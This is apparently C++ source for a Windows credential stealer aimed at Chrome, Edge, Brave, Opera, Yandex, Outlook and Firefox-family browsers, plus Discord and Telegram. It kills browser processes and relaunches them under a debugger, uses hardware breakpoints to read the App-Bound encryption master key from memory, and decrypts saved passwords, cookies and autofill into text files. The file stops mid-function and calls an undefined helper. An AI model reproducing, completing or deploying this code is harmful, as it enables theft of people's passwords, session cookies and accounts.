#include <windows.h>
#include <tlhelp32.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <fstream>
#include <algorithm>
#include <memory>
#include <cstring>
#include <regex>
#include <set>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "uuid.lib")

namespace fs = std::filesystem;

struct BrowserConfig {
    std::string name;
    std::string process_name;
    std::vector<std::wstring> exe_paths;
    std::string dll_name;
    std::vector<std::wstring> user_data_subdir;
    std::string output_dir;
    std::string temp_prefix;
    bool use_r14;
    bool use_roaming;
    bool has_abe;
    bool is_firefox;
};

// Function prototypes
void kill_processes_by_name(const std::string& target_name);
std::vector<std::wstring> get_search_roots();
std::wstring get_user_data_dir(const std::vector<std::wstring>& subdir, bool use_roaming);
std::vector<uint8_t> base64_decode(const std::string& input);
bool get_v10_key(const std::wstring& user_data_dir, std::vector<uint8_t>& key, bool& is_dpapi);
void extract_all_profiles_data(const std::vector<uint8_t>& v20_key, const BrowserConfig& config, const std::wstring& user_data_dir);
void debug_loop(HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir);
size_t find_target_address(HANDLE h_process, void* base_addr, const std::string& browser_name);
std::vector<uint32_t> get_all_threads(uint32_t process_id);
void set_hardware_breakpoint(uint32_t thread_id, size_t address);
void clear_hardware_breakpoints(uint32_t process_id);
void set_resume_flag(uint32_t thread_id);
bool extract_key(uint32_t thread_id, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir);
void extract_firefox_data(const BrowserConfig& config, const std::wstring& user_data_dir);
void extract_discord_tokens(const std::wstring& discord_path_w, const std::string& output_name);
void extract_telegram_session();

int main() {
    std::vector<BrowserConfig> configs = {
        {
            "New Outlook",
            "",
            {},
            "",
            {L"Microsoft", L"Olk", L"EBWebView"},
            "outlook_extract",
            "outlook_tmp",
            false, false, false, false
        },
        {
            "Google Chrome",
            "chrome.exe",
            {L"Google\\Chrome\\Application\\chrome.exe"},
            "chrome.dll",
            {L"Google", L"Chrome", L"User Data"},
            "chrome_extract",
            "chrome_tmp",
            false, false, true, false
        },
        {
            "Microsoft Edge",
            "msedge.exe",
            {L"Microsoft\\Edge\\Application\\msedge.exe"},
            "msedge.dll",
            {L"Microsoft", L"Edge", L"User Data"},
            "edge_extract",
            "edge_tmp",
            true, false, true, false
        },
        {
            "Brave",
            "brave.exe",
            {L"BraveSoftware\\Brave-Browser\\Application\\brave.exe"},
            "chrome.dll",
            {L"BraveSoftware", L"Brave-Browser", L"User Data"},
            "brave_extract",
            "brave_tmp",
            false, false, true, false
        },
        {
            "Opera Stable",
            "opera.exe",
            {L"Opera\\launcher.exe"},
            "launcher_lib.dll",
            {L"Opera Software", L"Opera Stable"},
            "opera_extract",
            "opera_tmp",
            false, true, false, false
        },
        {
            "Opera GX",
            "opera.exe",
            {L"Opera GX\\launcher.exe"},
            "launcher_lib.dll",
            {L"Opera Software", L"Opera GX Stable"},
            "operagx_extract",
            "operagx_tmp",
            false, true, false, false
        },
        {
            "Mozilla Firefox",
            "firefox.exe",
            {L"Mozilla Firefox\\firefox.exe"},
            "nss3.dll",
            {L"Mozilla", L"Firefox", L"Profiles"},
            "firefox_extract",
            "firefox_tmp",
            false, true, false, true
        },
        {
            "Waterfox",
            "waterfox.exe",
            {L"Waterfox\\waterfox.exe"},
            "nss3.dll",
            {L"Waterfox", L"Profiles"},
            "waterfox_extract",
            "waterfox_tmp",
            false, true, false, true
        },
        {
            "LibreWolf",
            "librewolf.exe",
            {L"LibreWolf\\librewolf.exe"},
            "nss3.dll",
            {L"LibreWolf", L"Profiles"},
            "librewolf_extract",
            "librewolf_tmp",
            false, true, false, true
        },
        {
            "Mozilla Thunderbird",
            "thunderbird.exe",
            {L"Mozilla Thunderbird\\thunderbird.exe"},
            "nss3.dll",
            {L"Thunderbird", L"Profiles"},
            "thunderbird_extract",
            "thunderbird_tmp",
            false, true, false, true
        },
        {
            "Yandex Browser",
            "browser.exe",
            {L"Yandex\\YandexBrowser\\Application\\browser.exe"},
            "browser.dll",
            {L"Yandex", L"YandexBrowser", L"User Data"},
            "yandex_extract",
            "yandex_tmp",
            false, false, false, false
        }
    };

    for (const auto& config : configs) {
        if (config.has_abe && !config.process_name.empty()) {
            kill_processes_by_name(config.process_name);
        }

        std::wstring user_data_dir = get_user_data_dir(config.user_data_subdir, config.use_roaming);

        // Outlook fallback check
        if (user_data_dir.empty() && config.name == "New Outlook") {
             user_data_dir = get_user_data_dir({L"Microsoft", L"Olk", L"EBWebView"}, false);
        }

        if (user_data_dir.empty()) {
            std::cout << "User data directory not found for " << config.name << ", skipping..." << std::endl;
            continue;
        }

        std::cout << "Processing " << config.name << "..." << std::endl;

        std::vector<uint8_t> v10_key;
        bool is_dpapi = false;
        bool has_key = get_v10_key(user_data_dir, v10_key, is_dpapi);

        bool should_debug = config.has_abe;

        if (config.is_firefox) {
            extract_firefox_data(config, user_data_dir);
            continue;
        }

        if (has_key) {
            if (is_dpapi && !config.has_abe) {
                std::cout << "Found DPAPI key for " << config.name << ", extracting immediately..." << std::endl;
                extract_all_profiles_data({}, config, user_data_dir);
                should_debug = false;
            } else if (!is_dpapi && !config.has_abe) {
                std::cout << "Found ABE key for " << config.name << ", extracting immediately..." << std::endl;
                extract_all_profiles_data(v10_key, config, user_data_dir);
                should_debug = false;
            }
        } else if (!config.has_abe) {
            // For Outlook or other non-ABE, try extraction even if Local State key isn't found (might use direct DPAPI)
            std::cout << "No Local State key found for " << config.name << ", attempting direct DPAPI extraction..." << std::endl;
            extract_all_profiles_data({}, config, user_data_dir);
            should_debug = false;
        }

        if (!should_debug && !config.has_abe) continue;

        // Debugger-based extraction requires the executable
        std::wstring exe_path = L"";
        std::vector<std::wstring> search_roots = get_search_roots();
        for (const auto& path : config.exe_paths) {
            for (const auto& root : search_roots) {
                fs::path full_path = fs::path(root) / path;
                if (fs::exists(full_path)) {
                    exe_path = full_path.wstring();
                    break;
                }
            }
            if (!exe_path.empty()) break;
        }

        if (exe_path.empty()) {
            // Check for New Outlook user path
            if (config.name == "New Outlook") {
                wchar_t* localAppData;
                if (SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppData) == S_OK) {
                    std::wstring outlookPath = std::wstring(localAppData) + L"\\Microsoft\\WindowsApps\\olk.exe";
                    CoTaskMemFree(localAppData);
                    if (fs::exists(outlookPath)) exe_path = outlookPath;
                }
            }
            // Check for Opera user path
            if (config.name.find("Opera") != std::string::npos) {
                wchar_t* localAppData;
                if (SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppData) == S_OK) {
                    std::wstring operaUserPath = localAppData;
                    CoTaskMemFree(localAppData);
                    if (config.name.find("GX") != std::string::npos) {
                        operaUserPath += L"\\Programs\\Opera GX\\opera.exe";
                    } else {
                        operaUserPath += L"\\Programs\\Opera\\opera.exe";
                    }
                    if (fs::exists(operaUserPath)) {
                        exe_path = operaUserPath;
                    }
                }
            }
            // Check for Yandex user path
            if (config.name.find("Yandex") != std::string::npos) {
                wchar_t* localAppData;
                if (SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppData) == S_OK) {
                    std::wstring yandexUserPath = std::wstring(localAppData) + L"\\Yandex\\YandexBrowser\\Application\\browser.exe";
                    CoTaskMemFree(localAppData);
                    if (fs::exists(yandexUserPath)) {
                        exe_path = yandexUserPath;
                    }
                }
            }
        }

        if (exe_path.empty()) {
            std::cout << "Executable not found for " << config.name << ", skipping debugger method..." << std::endl;
            continue;
        }

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        std::wstring cmd_line = L"\"" + exe_path + L"\" --no-first-run --no-default-browser-check";

        std::vector<wchar_t> cmd_buffer(cmd_line.begin(), cmd_line.end());
        cmd_buffer.push_back(0);

        if (CreateProcessW(NULL, cmd_buffer.data(), NULL, NULL, FALSE,
            DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {

            std::cout << "Started " << config.name << " with PID: " << pi.dwProcessId << std::endl;
            debug_loop(pi.hProcess, config, user_data_dir);

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            std::cerr << "Failed to create " << config.name << " process. Error: " << GetLastError() << std::endl;
        }
    }

    // Discord extraction
    struct DiscordConfig {
        std::string name;
        std::wstring subdir;
    };
    std::vector<DiscordConfig> discords = {
        {"Discord", L"discord"},
        {"Discord Canary", L"discordcanary"},
        {"Discord PTB", L"discordptb"},
        {"Lightcord", L"Lightcord"}
    };

    wchar_t* appdata;
    if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appdata) == S_OK) {
        fs::path roaming(appdata);
        CoTaskMemFree(appdata);
        for (const auto& d : discords) {
            fs::path p = roaming / d.subdir;
            if (fs::exists(p)) {
                extract_discord_tokens(p.wstring(), d.name);
            }
        }
    }

    extract_telegram_session();

    return 0;
}

void kill_processes_by_name(const std::string& target_name) {
    std::wstring target_name_w(target_name.begin(), target_name.end());
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(snapshot, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, target_name_w.c_str()) == 0) {
                    HANDLE h_process = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (h_process) {
                        TerminateProcess(h_process, 0);
                        CloseHandle(h_process);
                    }
                }
            } while (Process32NextW(snapshot, &pe));
        }
        CloseHandle(snapshot);
    }
}

std::vector<uint32_t> get_all_threads(uint32_t process_id) {
    std::vector<uint32_t> threads;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te;
        te.dwSize = sizeof(THREADENTRY32);
        if (Thread32First(snapshot, &te)) {
            do {
                if (te.th32OwnerProcessID == process_id) {
                    threads.push_back(te.th32ThreadID);
                }
            } while (Thread32Next(snapshot, &te));
        }
        CloseHandle(snapshot);
    }
    return threads;
}

void set_hardware_breakpoint(uint32_t thread_id, size_t address) {
    HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
    if (h_thread) {
        SuspendThread(h_thread);
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (GetThreadContext(h_thread, &ctx)) {
            ctx.Dr0 = address;
            ctx.Dr7 = (ctx.Dr7 & ~0b11) | 0b01; // Enable DR0 local
            SetThreadContext(h_thread, &ctx);
        }
        ResumeThread(h_thread);
        CloseHandle(h_thread);
    }
}

void clear_hardware_breakpoints(uint32_t process_id) {
    std::vector<uint32_t> threads = get_all_threads(process_id);
    for (uint32_t thread_id : threads) {
        HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
        if (h_thread) {
            SuspendThread(h_thread);
            CONTEXT ctx = { 0 };
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            if (GetThreadContext(h_thread, &ctx)) {
                ctx.Dr0 = 0;
                ctx.Dr7 &= ~0b11; // Disable DR0
                SetThreadContext(h_thread, &ctx);
            }
            ResumeThread(h_thread);
            CloseHandle(h_thread);
        }
    }
}

void set_resume_flag(uint32_t thread_id) {
    HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
    if (h_thread) {
        SuspendThread(h_thread);
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_CONTROL;
        if (GetThreadContext(h_thread, &ctx)) {
            ctx.EFlags |= 0x10000; // Set RF (Resume Flag)
            SetThreadContext(h_thread, &ctx);
        }
        ResumeThread(h_thread);
        CloseHandle(h_thread);
    }
}

std::vector<uint8_t> base64_decode(const std::string& input) {
    DWORD out_len = 0;
    if (CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL)) {
        std::vector<uint8_t> out(out_len);
        if (CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, out.data(), &out_len, NULL, NULL)) {
            return out;
        }
    }
    return {};
}

std::vector<std::wstring> get_search_roots() {
    std::vector<std::wstring> roots;
    wchar_t* path = NULL;
    if (SHGetKnownFolderPath(FOLDERID_ProgramFiles, 0, NULL, &path) == S_OK) {
        roots.push_back(path);
        CoTaskMemFree(path);
    }
    if (SHGetKnownFolderPath(FOLDERID_ProgramFilesX86, 0, NULL, &path) == S_OK) {
        roots.push_back(path);
        CoTaskMemFree(path);
    }
    if (SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &path) == S_OK) {
        roots.push_back(path);
        CoTaskMemFree(path);
    }
    // Check for ProgramW6432 environment variable
    wchar_t env_path[MAX_PATH];
    if (GetEnvironmentVariableW(L"ProgramW6432", env_path, MAX_PATH) > 0) {
        roots.push_back(env_path);
    }
    return roots;
}

std::wstring get_user_data_dir(const std::vector<std::wstring>& subdir, bool use_roaming) {
    wchar_t* path = NULL;
    if (SHGetKnownFolderPath(use_roaming ? FOLDERID_RoamingAppData : FOLDERID_LocalAppData, 0, NULL, &path) == S_OK) {
        fs::path p(path);
        CoTaskMemFree(path);
        for (const auto& component : subdir) {
            p /= component;
        }
        if (fs::exists(p)) return p.wstring();
    }
    return L"";
}

bool get_v10_key(const std::wstring& user_data_dir, std::vector<uint8_t>& key, bool& is_dpapi) {
    fs::path local_state_path = fs::path(user_data_dir) / L"Local State";
    std::ifstream ifs(local_state_path);
    if (!ifs.is_open()) return false;

    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
    size_t pos = content.find("\"encrypted_key\":\"");
    if (pos == std::string::npos) return false;
    pos += 17;
    size_t end = content.find("\"", pos);
    if (end == std::string::npos) return false;

    std::string encrypted_key_b64 = content.substr(pos, end - pos);
    std::vector<uint8_t> encrypted_key = base64_decode(encrypted_key_b64);
    if (encrypted_key.empty()) return false;

    is_dpapi = (encrypted_key.size() >= 5 && memcmp(encrypted_key.data(), "DPAPI", 5) == 0);
    const uint8_t* blob_data = is_dpapi ? encrypted_key.data() + 5 : encrypted_key.data();
    size_t blob_size = is_dpapi ? encrypted_key.size() - 5 : encrypted_key.size();

    DATA_BLOB input = { (DWORD)blob_size, (BYTE*)blob_data };
    DATA_BLOB output = { 0, NULL };

    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
        if (output.cbData == 32) {
            key.assign(output.pbData, output.pbData + output.cbData);
            LocalFree(output.pbData);
            return true;
        }
        LocalFree(output.pbData);
    }
    return false;
}

std::vector<uint8_t> decrypt_aes_gcm(const std::vector<uint8_t>& key, const std::vector<uint8_t>& nonce, const std::vector<uint8_t>& ciphertext) {
    BCRYPT_ALG_HANDLE h_alg = NULL;
    BCRYPT_KEY_HANDLE h_key = NULL;
    std::vector<uint8_t> plaintext;

    if (BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_AES_ALGORITHM, NULL, 0) == 0) {
        if (BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) == 0) {
            if (BCryptGenerateSymmetricKey(h_alg, &h_key, NULL, 0, (BYTE*)key.data(), (ULONG)key.size(), 0) == 0) {
                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
                BCRYPT_INIT_AUTH_MODE_INFO(auth_info);

                // Last 16 bytes are the tag
                if (ciphertext.size() > 16) {
                    std::vector<uint8_t> actual_ciphertext(ciphertext.begin(), ciphertext.end() - 16);
                    std::vector<uint8_t> tag(ciphertext.end() - 16, ciphertext.end());

                    auth_info.pbNonce = (BYTE*)nonce.data();
                    auth_info.cbNonce = (ULONG)nonce.size();
                    auth_info.pbTag = tag.data();
                    auth_info.cbTag = (ULONG)tag.size();

                    DWORD out_len = 0;
                    if (BCryptDecrypt(h_key, (BYTE*)actual_ciphertext.data(), (ULONG)actual_ciphertext.size(), &auth_info, NULL, 0, NULL, 0, &out_len, 0) == 0) {
                        plaintext.resize(out_len);
                        if (BCryptDecrypt(h_key, (BYTE*)actual_ciphertext.data(), (ULONG)actual_ciphertext.size(), &auth_info, NULL, 0, plaintext.data(), (ULONG)plaintext.size(), &out_len, 0) != 0) {
                            plaintext.clear();
                        }
                    }
                }
            }
        }
    }

    if (h_key) BCryptDestroyKey(h_key);
    if (h_alg) BCryptCloseAlgorithmProvider(h_alg, 0);
    return plaintext;
}

bool is_mostly_printable(const std::vector<uint8_t>& data) {
    if (data.empty()) return true;
    size_t printable = 0;
    for (uint8_t b : data) {
        if ((b >= 32 && b <= 126) || b == '\r' || b == '\n' || b == '\t') printable++;
    }
    return (double)printable / data.size() > 0.8;
}

std::vector<uint8_t> decrypt_blob(const std::vector<uint8_t>& blob, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera) {
    if (blob.empty()) return {};

    if (blob.size() > 15 && memcmp(blob.data(), "v10", 3) == 0) {
        std::vector<uint8_t> nonce(blob.begin() + 3, blob.begin() + 15);
        std::vector<uint8_t> ciphertext(blob.begin() + 15, blob.end());

        // Try v10 key first
        if (!v10_key.empty()) {
            std::vector<uint8_t> dec = decrypt_aes_gcm(v10_key, nonce, ciphertext);
            if (!dec.empty()) {
                // In some new versions, even v10 blobs can have a 32-byte App-Bound header
                if (dec.size() > 32) {
                    std::vector<uint8_t> header(dec.begin(), dec.begin() + 32);
                    if (is_opera || !is_mostly_printable(header)) {
                        return std::vector<uint8_t>(dec.begin() + 32, dec.end());
                    }
                }
                return dec;
            }
        }
        // Fallback to v20 key (App-Bound)
        if (!v20_key.empty()) {
            std::vector<uint8_t> dec = decrypt_aes_gcm(v20_key, nonce, ciphertext);
            if (!dec.empty()) {
                if (dec.size() > 32) return std::vector<uint8_t>(dec.begin() + 32, dec.end());
                return dec;
            }
        }
    } else if (blob.size() > 15 && memcmp(blob.data(), "v20", 3) == 0) {
        std::vector<uint8_t> nonce(blob.begin() + 3, blob.begin() + 15);
        std::vector<uint8_t> ciphertext(blob.begin() + 15, blob.end());

        // Try v20 key first
        if (!v20_key.empty()) {
            std::vector<uint8_t> dec = decrypt_aes_gcm(v20_key, nonce, ciphertext);
            if (!dec.empty()) {
                if (dec.size() > 32) return std::vector<uint8_t>(dec.begin() + 32, dec.end());
                return dec;
            }
        }
        // Fallback to v10 key
        if (!v10_key.empty()) {
            std::vector<uint8_t> dec = decrypt_aes_gcm(v10_key, nonce, ciphertext);
            if (!dec.empty()) {
                if (dec.size() > 32) {
                    std::vector<uint8_t> header(dec.begin(), dec.begin() + 32);
                    if (is_opera || !is_mostly_printable(header)) {
                        return std::vector<uint8_t>(dec.begin() + 32, dec.end());
                    }
                }
                return dec;
            }
        }
    } else if (blob.size() > 15) {
        DATA_BLOB input = { (DWORD)blob.size(), (BYTE*)blob.data() };
        DATA_BLOB output = { 0, NULL };
        if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
            std::vector<uint8_t> dec(output.pbData, output.pbData + output.cbData);
            LocalFree(output.pbData);
            return dec;
        }
    }

    return {};
}

std::vector<uint8_t> read_process_memory_chunk(HANDLE h_process, void* addr, size_t size) {
    std::vector<uint8_t> buffer(size);
    SIZE_T bytes_read = 0;
    if (ReadProcessMemory(h_process, addr, buffer.data(), size, &bytes_read)) {
        buffer.resize(bytes_read);
    } else {
        buffer.clear();
    }
    return buffer;
}

size_t find_subsequence(const std::vector<uint8_t>& haystack, const std::vector<uint8_t>& needle) {
    auto it = std::search(haystack.begin(), haystack.end(), needle.begin(), needle.end());
    if (it != haystack.end()) {
        return std::distance(haystack.begin(), it);
    }
    return std::string::npos;
}

size_t find_target_address(HANDLE h_process, void* base_addr, const std::string& browser_name) {
    IMAGE_DOS_HEADER dos_header;
    SIZE_T bytes_read = 0;
    if (!ReadProcessMemory(h_process, base_addr, &dos_header, sizeof(dos_header), &bytes_read)) return 0;

    IMAGE_NT_HEADERS64 nt_headers;
    if (!ReadProcessMemory(h_process, (BYTE*)base_addr + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers), &bytes_read)) return 0;

    WORD section_count = nt_headers.FileHeader.NumberOfSections;
    std::vector<IMAGE_SECTION_HEADER> sections(section_count);
    if (!ReadProcessMemory(h_process, (BYTE*)base_addr + dos_header.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + nt_headers.FileHeader.SizeOfOptionalHeader, sections.data(), sizeof(IMAGE_SECTION_HEADER) * section_count, &bytes_read)) return 0;

    std::string target_string = "OSCrypt.AppBoundProvider.Decrypt.ResultCode";
    std::vector<uint8_t> needle(target_string.begin(), target_string.end());
    size_t string_va = 0;

    for (const auto& section : sections) {
        if (strncmp((char*)section.Name, ".rdata", 6) == 0) {
            std::vector<uint8_t> section_data = read_process_memory_chunk(h_process, (BYTE*)base_addr + section.VirtualAddress, section.Misc.VirtualSize);
            size_t pos = find_subsequence(section_data, needle);
            if (pos != std::string::npos) {
                string_va = (size_t)base_addr + section.VirtualAddress + pos;
                break;
            }
        }
    }

    if (string_va == 0) {
        std::cout << "Could not find target string in " << browser_name << "'s .rdata section" << std::endl;
        return 0;
    }

    for (const auto& section : sections) {
        if (strncmp((char*)section.Name, ".text", 5) == 0) {
            size_t section_start = (size_t)base_addr + section.VirtualAddress;
            std::vector<uint8_t> section_data = read_process_memory_chunk(h_process, (BYTE*)base_addr + section.VirtualAddress, section.Misc.VirtualSize);

            for (size_t pos = 0; pos + 7 <= section_data.size(); ++pos) {
                if (section_data[pos] == 0x48 && section_data[pos+1] == 0x8D && section_data[pos+2] == 0x0D) {
                    int32_t offset = *(int32_t*)&section_data[pos+3];
                    size_t rip = section_start + pos + 7;
                    size_t target = (size_t)((int64_t)rip + offset);

                    if (target == string_va) {
                        std::cout << "Found matching LEA instruction at 0x" << std::hex << section_start + pos << " for " << browser_name << std::dec << std::endl;
                        return section_start + pos;
                    }
                }
            }
        }
    }

    std::cout << "Could not find matching LEA instruction in " << browser_name << "'s .text section" << std::endl;
    return 0;
}

void debug_loop(HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir) {
    DEBUG_EVENT debug_event = { 0 };
    size_t target_address = 0;

    while (WaitForDebugEvent(&debug_event, INFINITE)) {
        switch (debug_event.dwDebugEventCode) {
            case LOAD_DLL_DEBUG_EVENT: {
                wchar_t buffer[MAX_PATH];
                if (GetFinalPathNameByHandleW(debug_event.u.LoadDll.hFile, buffer, MAX_PATH, 0)) {
                    std::wstring path = buffer;
                    std::wstring dll_name_w(config.dll_name.begin(), config.dll_name.end());
                    if (path.find(dll_name_w) != std::wstring::npos) {
                        std::cout << "Found " << config.dll_name << " at " << std::hex << debug_event.u.LoadDll.lpBaseOfDll << std::dec << std::endl;
                        target_address = find_target_address(h_process, debug_event.u.LoadDll.lpBaseOfDll, config.name);
                        if (target_address != 0) {
                            std::vector<uint32_t> threads = get_all_threads(debug_event.dwProcessId);
                            std::cout << "Setting hardware breakpoints for " << config.name << " on " << threads.size() << " threads" << std::endl;
                            for (uint32_t thread_id : threads) {
                                set_hardware_breakpoint(thread_id, target_address);
                            }
                        }
                    }
                }
                break;
            }
            case CREATE_THREAD_DEBUG_EVENT: {
                if (target_address != 0) {
                    set_hardware_breakpoint(debug_event.dwThreadId, target_address);
                }
                break;
            }
            case EXCEPTION_DEBUG_EVENT: {
                if (debug_event.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP) {
                    if ((size_t)debug_event.u.Exception.ExceptionRecord.ExceptionAddress == target_address) {
                        std::cout << "Target breakpoint hit!" << std::endl;
                        if (extract_key(debug_event.dwThreadId, h_process, config, user_data_dir)) {
                            clear_hardware_breakpoints(debug_event.dwProcessId);
                            TerminateProcess(h_process, 0);
                        }
                    }
                    set_resume_flag(debug_event.dwThreadId);
                }
                break;
            }
            case EXIT_PROCESS_DEBUG_EVENT:
                goto end_loop;
        }
        ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
    }
end_loop:;
}

bool extract_key(uint32_t thread_id, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir) {
    HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, thread_id);
    if (!h_thread) return false;

    bool success = false;
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    if (GetThreadContext(h_thread, &ctx)) {
        std::vector<DWORD64> key_ptrs = config.use_r14 ? std::vector<DWORD64>{ctx.R14, ctx.R15} : std::vector<DWORD64>{ctx.R15, ctx.R14};

        for (DWORD64 ptr : key_ptrs) {
            if (ptr == 0) continue;
            std::vector<uint8_t> buffer(32);
            SIZE_T bytes_read = 0;
            if (ReadProcessMemory(h_process, (LPCVOID)ptr, buffer.data(), 32, &bytes_read)) {
                DWORD64 data_ptr = ptr;
                uint64_t length = *(uint64_t*)&buffer[8];
                if (length == 32) {
                    data_ptr = *(DWORD64*)&buffer[0];
                }

                std::vector<uint8_t> key(32);
                if (ReadProcessMemory(h_process, (LPCVOID)data_ptr, key.data(), 32, &bytes_read)) {
                    bool all_zero = true;
                    for (uint8_t b : key) if (b != 0) { all_zero = false; break; }
                    if (!all_zero) {
                        std::cout << "Extracted Master Key from 0x" << std::hex << data_ptr << std::dec << std::endl;
                        extract_all_profiles_data(key, config, user_data_dir);
                        success = true;
                        break;
                    }
                }
            }
        }
    }

    CloseHandle(h_thread);
    return success;
}

#include "includes/sqlite3.h"

int open_db_readonly(const fs::path& db_path, sqlite3** db) {
    std::string path_utf8 = to_narrow_string(db_path.wstring().c_str());
    std::string uri = "file:" + path_utf8 + "?mode=ro&nolock=1";
    return sqlite3_open_v2(uri.c_str(), db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL);
}

void extract_passwords(const fs::path& profile_path, const fs::path& output_dir, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, const std::string& temp_prefix, bool is_opera) {
    fs::path db_path = profile_path / "Login Data";
    if (!fs::exists(db_path)) {
        db_path = profile_path / "Ya Passman Data";
    }
    if (!fs::exists(db_path)) return;

    sqlite3* db;
    if (open_db_readonly(db_path, &db) == SQLITE_OK) {
        sqlite3_stmt* stmt;
        const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            std::ofstream ofs(output_dir / "passwords.txt");
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* url = (const char*)sqlite3_column_text(stmt, 0);
                const char* user = (const char*)sqlite3_column_text(stmt, 1);
                const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 2);
                int blob_size = sqlite3_column_bytes(stmt, 2);

                std::vector<uint8_t> blob(blob_ptr, blob_ptr + blob_size);
                std::vector<uint8_t> dec = decrypt_blob(blob, v10_key, v20_key, is_opera);
                if (!dec.empty()) {
                    ofs << "URL: " << (url ? url : "") << "\nUser: " << (user ? user : "") << "\nPass: " << std::string(dec.begin(), dec.end()) << "\n---\n";
                }
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
    }
}

void extract_cookies(const fs::path& profile_path, const fs::path& output_dir, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, const std::string& temp_prefix, bool is_opera) {
    fs::path db_path = profile_path / "Network" / "Cookies";
    if (!fs::exists(db_path)) db_path = profile_path / "Cookies";
    if (!fs::exists(db_path)) return;

    sqlite3* db;
    if (open_db_readonly(db_path, &db) == SQLITE_OK) {
        sqlite3_stmt* stmt;
        const char* sql = "SELECT host_key, name, value, encrypted_value FROM cookies";
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            std::ofstream ofs(output_dir / "cookies.txt");
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* host = (const char*)sqlite3_column_text(stmt, 0);
                const char* name = (const char*)sqlite3_column_text(stmt, 1);
                const char* value = (const char*)sqlite3_column_text(stmt, 2);
                const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3);
                int blob_size = sqlite3_column_bytes(stmt, 3);

                std::vector<uint8_t> blob(blob_ptr, blob_ptr + blob_size);
                std::vector<uint8_t> dec = decrypt_blob(blob, v10_key, v20_key, is_opera);

                std::string cookie_val = !dec.empty() ? std::string(dec.begin(), dec.end()) : (value ? value : "");
                if (!cookie_val.empty()) {
                    ofs << "Host: " << (host ? host : "") << " | Name: " << (name ? name : "") << " | Value: " << cookie_val << "\n";
                }
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
    }
}

void extract_autofill(const fs::path& profile_path, const fs::path& output_dir, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, const std::string& temp_prefix, bool is_opera) {
    std::vector<std::string> db_names = {"Web Data", "Ya Autofill Data", "Ya Credit Cards"};

    std::ofstream ofs(output_dir / "autofill.txt");

    for (const auto& db_name : db_names) {
        fs::path db_path = profile_path / db_name;
        if (!fs::exists(db_path)) continue;

        sqlite3* db;
        if (open_db_readonly(db_path, &db) == SQLITE_OK) {
